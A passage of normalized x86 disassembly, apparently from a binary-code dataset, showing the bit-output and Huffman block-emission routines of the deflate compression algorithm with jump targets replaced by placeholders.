mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x54 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x50 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0xab8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x40 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0xab8 ]
mov [ ebp - 0x44 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x44 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x44 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x40 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0xab4 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x30 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + 0xab4 ]
mov [ ebp - 0x34 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x34 ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x34 ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x30 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + ecx * 4 + 0xa74 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x16b4 ]
shl eax cl
mov edx [ ebp + 0x8 ]
mov cx [ edx + 0x16b0 ]
or cx ax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x28 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov ecx [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + ecx * 4 + 0xa74 ]
mov [ ebp - 0x2c ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x2c ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x2c ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x28 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
mov edx [ ebp - 0x14 ]
mov [ ebp - 0x18 ] edx
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
sub edx 0xb
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x58 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov ecx [ ebp - 0x4 ]
sub ecx 0xb
mov [ ebp - 0x5c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x5c ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x5c ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x58 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov [ ebp - 0x58 ] 0x7
mov edx 0x10
sub edx [ ebp - 0x58 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov edx [ ebp - 0x4 ]
sub edx 0x3
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x48 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov ecx [ ebp - 0x4 ]
sub ecx 0x3
mov [ ebp - 0x4c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4c ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x4c ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x48 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov [ ebp - 0x48 ] 0x3
mov edx 0x10
sub edx [ ebp - 0x48 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov edx [ ebp - 0x4 ]
sub edx 0x3
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x38 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov ecx [ ebp - 0x4 ]
sub ecx 0x3
mov [ ebp - 0x3c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x3c ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x3c ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x38 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov [ ebp - 0x38 ] 0x2
mov edx 0x10
sub edx [ ebp - 0x38 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov eax [ ebp - 0x4 ]
sub eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov [ ebp - 0xc ] 0x8a
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov [ ebp - 0xc ] 0x7
mov [ ebp - 0x10 ] 0x4
mov [ ebp - 0xc ] 0x6
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
jmp r-xdata
sub_407ef4
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1698 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x169c ]
mov dx [ ebp + 0xc ]
mov [ eax + ecx * 2 ] dx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1690 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1698 ]
mov dl [ ebp + 0x10 ]
mov [ ecx + eax ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1698 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1698 ] ecx
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16a8 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16a8 ] eax
mov edx [ ebp + 0xc ]
sub edx 0x1
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x10 ]
xor ecx ecx
mov cl [ eax + r--data ]
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 4 + 0x490 ]
add ax 0x1
mov ecx [ ebp + 0x10 ]
xor edx edx
mov dl [ ecx + r--data ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + edx * 4 + 0x490 ] ax
cmp [ ebp + 0xc ] 0x100
jae r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + eax * 4 + 0x8c ]
add dx 0x1
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax * 4 + 0x8c ] dx
jmp r-xdata
mov ecx [ ebp + 0xc ]
shr ecx 0x7
xor edx edx
mov dl [ ecx + r--data ]
mov [ ebp - 0x4 ] edx
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + r--data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1694 ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
xor edx edx
cmp [ ecx + 0x1698 ] eax
sete dl
mov eax edx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + eax * 4 + 0x980 ]
add dx 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax * 4 + 0x980 ] dx
sub_408022
push ebp
mov ebp esp
sub esp 0x48
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1698 ] 0x0
je r-xdata
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + 0x402 ]
mov [ ebp - 0x40 ] eax
mov ecx 0x10
sub ecx [ ebp - 0x40 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x16b4 ] ecx
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x169c ]
mov eax [ ebp - 0x14 ]
xor ecx ecx
mov cx [ edx + eax * 2 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1690 ]
mov ecx [ ebp - 0x14 ]
xor edx edx
mov dl [ eax + ecx ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
xor edx edx
mov dx [ ecx + 0x400 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x40 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cx [ eax + 0x400 ]
mov [ ebp - 0x44 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x44 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x44 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x40 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
xor ecx ecx
mov cl [ eax + r--data ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0x406 ]
mov [ ebp - 0x20 ] ecx
mov edx 0x10
sub edx [ ebp - 0x20 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + ecx * 4 + 0x2 ]
mov [ ebp - 0x18 ] eax
mov ecx 0x10
sub ecx [ ebp - 0x18 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x16b4 ] ecx
jle r-xdata
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + 0x402 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16ac ] eax
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + ecx * 4 + 0x404 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x16b4 ]
shl eax cl
mov edx [ ebp + 0x8 ]
mov cx [ edx + 0x16b0 ]
or cx ax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + ecx * 4 + 0x404 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x24 ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x20 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + ecx * 4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x16b4 ]
shl eax cl
mov edx [ ebp + 0x8 ]
mov cx [ edx + 0x16b0 ]
or cx ax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov eax [ ebp - 0xc ]
mov ecx [ ebp + 0xc ]
xor edx edx
mov dx [ ecx + eax * 4 ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x1c ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x1c ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x18 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
sub eax 0x1
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x100
jae r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
sub eax [ edx * 4 + r--data ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x28 ] ecx
mov edx 0x10
sub edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax * 4 + r--data ]
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
cmp ecx [ eax + 0x1698 ]
jb r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
shr eax 0x7
xor ecx ecx
mov cl [ eax + r--data ]
mov [ ebp - 0x48 ] ecx
mov ecx [ ebp - 0x8 ]
xor edx edx
mov dl [ ecx + r--data ]
mov [ ebp - 0x48 ] edx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x28 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x2c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x2c ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
